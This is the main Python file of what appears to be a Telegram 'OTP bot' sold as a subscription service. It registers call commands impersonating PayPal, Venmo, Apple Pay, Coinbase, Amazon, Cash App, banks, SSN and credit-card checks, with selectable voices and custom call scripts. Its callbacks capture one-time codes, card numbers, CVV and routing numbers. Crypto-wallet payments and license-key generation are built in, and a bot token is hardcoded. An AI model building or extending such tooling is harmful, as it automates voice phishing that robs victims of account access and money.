import asyncio
import os
import psutil
import traceback

from aiogram import Bot, Dispatcher
from aiogram.filters import Command

from utils import (
    db,
    load_all_users,
    load_messages,
    reload_users_every_12h,
    load_keyboards
)
from handlers import *
from config import get_admin
from messages import start_telethon_worker

# ================== CONFIG ==================

BOT_TOKEN = "7886245319:AAGP1f1WQ_1Baw5ewNNlHTa6JsWRud5GP1Q"
ERROR_CHANNEL_ID = -1003771364465

# ============================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(skip_updates=True)

# ============================================
# ERROR REPORTING
# ============================================

async def report_error(error: Exception, where="Unknown"):
    tb = "".join(
        traceback.format_exception(type(error), error, error.__traceback__)
    )

    text = (
        "🚨 <b>BOT ERROR</b>\n\n"
        f"<b>Where:</b> {where}\n"
        f"<b>Type:</b> {type(error).__name__}\n"
        f"<b>Message:</b> {error}\n\n"
        f"<pre>{tb[:3500]}</pre>"
    )

    try:
        await bot.send_message(ERROR_CHANNEL_ID, text, parse_mode="HTML")
    except Exception:
        pass  # avoid infinite loop


async def safe_task(coro, name):
    try:
        await coro
    except asyncio.CancelledError:
        pass
    except Exception as e:
        await report_error(e, where=name)


# ============================================
# MEMORY LOGGER
# ============================================

def get_memory_usage():
    process = psutil.Process(os.getpid())
    return round(process.memory_info().rss / (1024 * 1024), 2)


async def log_memory():
    while True:
        await bot.send_message(
            -1002942544591,
            f"💾 Memory usage: {get_memory_usage()} MB"
        )
        await asyncio.sleep(300)


# ============================================
# AIROGRAM ERROR HANDLER
# ============================================

@dp.errors()
async def global_aiogram_error_handler(event, exception):
    await report_error(exception, where="Aiogram Handler")
    return True


# ============================================
# COMMAND & CALLBACK REGISTRATION
# ============================================

# BASIC
dp.message.register(help_command, Command(commands=["help"]))
dp.message.register(start_command, Command(commands=["start"]))

dp.callback_query.register(help_callback, lambda c: c.data == "help")
dp.callback_query.register(proofs_callback, lambda c: c.data == "proofs")
dp.callback_query.register(features_callback, lambda c: c.data == "features")
dp.callback_query.register(start_callback, lambda c: c.data in ["back1", "back3", "back4"])

# SUBSCRIPTIONS
dp.message.register(purchase_command, Command(commands=["purchase"]))
dp.message.register(prices_command, Command(commands=["prices"]))
dp.message.register(my_profile_command, Command(commands=["plan"]))
dp.message.register(redeem_keys, Command(commands=["redeem"]))

dp.callback_query.register(wallets_callback, lambda c: c.data in ['15','25','89','149','299','999'])
dp.callback_query.register(wallet_callback, lambda c: ':' in c.data)
dp.callback_query.register(purchase_callback, lambda c: c.data == "purchase")

# CALL
dp.message.register(
    call_command,
    Command(commands=[
        'repportcall', 'recall', "call", "paypal", "venmo", "applepay",
        "coinbase", "microsoft", "amazon", "quadpay", "cashapp",
        "citizens", "marcus", "carrier", 'creditcard',
        'ssn', 'customcall', 'customvoice'
    ])
)

dp.message.register(Phonelist_commands, Command(commands=["phonelist"]))

dp.callback_query.register(
    otp_accept_callback,
    lambda c: c.data in ["acp", "den", "card", "cvv", "rout"]
)

# SETTINGS
dp.message.register(voicelist_command, Command(commands=["voicelist"]))
dp.message.register(setvoice_command, Command(commands=["setvoice"]))
dp.message.register(setscript_command, Command(commands=["createscript"]))
dp.message.register(process_script_text, ScriptForm.waiting_for_script)
dp.message.register(view_script, Command(commands=["script"]))

dp.callback_query.register(
    changevoice_callback,
    lambda c: c.data in ['Michael', 'Ethan', 'Mark', 'Mia', 'Sofia', 'Andria']
)

# ADMIN
dp.message.register(ban_command, Command(commands=["ban"]))
dp.message.register(unban_command, Command(commands=["unban"]))
dp.message.register(reload_command, Command(commands=["reload"]))
dp.message.register(reload_messages_command, Command(commands=["refresh"]))
dp.message.register(getwallet_command, Command(commands=["wallet"]))
dp.message.register(switch_command, Command(commands=["switch"]))
dp.message.register(send_all, Command(commands=["news"]))
dp.message.register(keys_command, Command(commands=["keys"]))
dp.message.register(generate_keys_command, Command(commands=["gkeys"]))

dp.callback_query.register(keys_callback, lambda c: c.data == 'keys')
dp.callback_query.register(generate_keys_callback, lambda c: c.data == 'g_keys')
dp.callback_query.register(
    get_keys_callback,
    lambda c: c.data in [
        '2 hours', '1 day', '4 days',
        '1 week', '1 month', 'lifetime'
    ]
)

# ============================================
# MAIN
# ============================================

async def main():
    try:
        print("🤖 Bot starting...")

        await db.init_db()
        await db.create_tables()
        await load_all_users()
        await load_messages()
        await load_keyboards()

        asyncio.create_task(safe_task(log_memory(), "Memory Logger"))
        asyncio.create_task(safe_task(reload_users_every_12h(), "User Reload"))

        await bot.send_message(get_admin()['id'], "🟢 Bot online")

        asyncio.create_task(
            safe_task(start_telethon_worker(), "Telethon Worker")
        )

        await dp.start_polling(bot)

    except Exception as e:
        await report_error(e, where="Main Loop")

    finally:
        print("🛑 Bot shutting down")
        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())

















